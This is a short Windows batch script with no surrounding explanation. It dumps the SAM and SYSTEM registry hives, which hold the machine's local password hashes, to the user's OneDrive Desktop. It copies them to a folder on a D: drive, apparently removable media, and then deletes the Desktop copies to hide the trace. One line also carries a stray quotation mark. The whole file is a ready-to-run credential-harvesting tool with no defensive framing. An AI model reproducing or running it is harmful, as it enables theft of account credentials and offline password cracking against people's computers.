@echo off
reg save HKLM\SAM c:\Users\%username%\OneDrive\Desktop\sam.save"
reg save HKLM\SYSTEM c:\Users\%username%\OneDrive\Desktop\system.save
xcopy "C:\Users\%username%\OneDrive\Desktop\sam.save" "D:\Stuff\info\" 
xcopy "C:\Users\%username%\OneDrive\Desktop\system.save" "D:\Stuff\info\" 
del c:\Users\%username%\OneDrive\Desktop\sam.save
del c:\Users\%username%\OneDrive\Desktop\system.save